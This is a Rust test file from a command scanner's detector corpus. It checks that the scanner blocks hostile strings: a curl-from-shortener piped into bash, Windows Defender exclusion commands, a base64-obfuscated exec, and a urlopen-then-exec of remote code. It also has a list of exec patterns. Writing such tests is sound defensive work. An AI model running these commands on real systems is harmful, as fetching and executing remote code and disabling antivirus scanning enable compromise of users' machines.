//! Tirith detector-corpus excerpt: attack strings the scanner must catch.
//! Nothing here executes; each literal is a test vector or signature entry.
use tirith_core::engine::analyze_exec;

#[test]
fn shortener_pipe_is_blocked() {
    let (verdict, _) = analyze_exec("curl https://bit.ly/install | bash", None);
    assert!(verdict.is_block());
}

#[test]
fn exclusion_vectors_are_flagged() {
    for vector in [
        "Add-MpPreference -ExclusionPath C:\\Temp",
        "Set-MpPreference -ExclusionProcess malware.exe",
    ] {
        let (verdict, _) = analyze_exec(vector, None);
        assert!(verdict.is_block());
    }
}

#[test]
fn base64_obfuscated_body_is_flagged() {
    let inner = "os.system('id')";
    let body = format!("import base64; exec(base64.b64decode('{inner}'))");
    let caps = scan_capabilities(&body);
    assert!(caps.dynamic_exec);
}

#[test]
fn urlopen_exec_is_flagged() {
    let body = "exec(urllib.request.urlopen('http://example.test/x').read())";
    assert!(scan_capabilities(&body).dynamic_exec);
}

const EXEC_PATTERNS: &[&str] = &["exec(", "base64.b64decode(", "urllib.request.urlopen("];
